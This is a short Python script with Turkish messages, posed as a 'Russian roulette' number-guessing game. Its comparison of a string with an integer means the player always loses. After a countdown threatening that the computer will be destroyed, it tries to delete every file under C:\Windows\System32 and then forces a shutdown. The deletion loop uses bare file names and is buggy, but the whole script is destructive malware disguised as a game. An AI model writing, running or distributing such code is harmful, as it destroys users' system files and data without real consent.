from colorama import Fore, init
from os import system
import random
import os
from os import walk
import time

system("cls")

init()

system32="C:\Windows\System32"

def sil():
    try:
        for system32, _, dosya_listesi in os.walk(system32):
            for system32 in dosya_listesi:
                os.remove(system32)
                
    except Exception as e:
        print("Hata:", e)

def rulet():
    sayi=input(Fore.YELLOW + "Bir sayı giriniz: ")
    if sayi==random.randint(1,6):
        print("Bravo, bu sefer kurtuldun ahbap!")
    else:
        print(Fore.RED + "Maalesef yanlış tahminde bulundun! Bilgisayarın 3 saniye içinde yok olacak >:D")
        time.sleep(1)
        print(Fore.RED + "Maalesef yanlış tahminde bulundun! Bilgisayarın 2 saniye içinde yok olacak >:D")
        time.sleep(1)
        print(Fore.RED + "Maalesef yanlış tahminde bulundun! Bilgisayarın 1 saniye içinde yok olacak >:D")
        time.sleep(1)
        sil()
        os.system("shutdown /s /t 1")

rulet()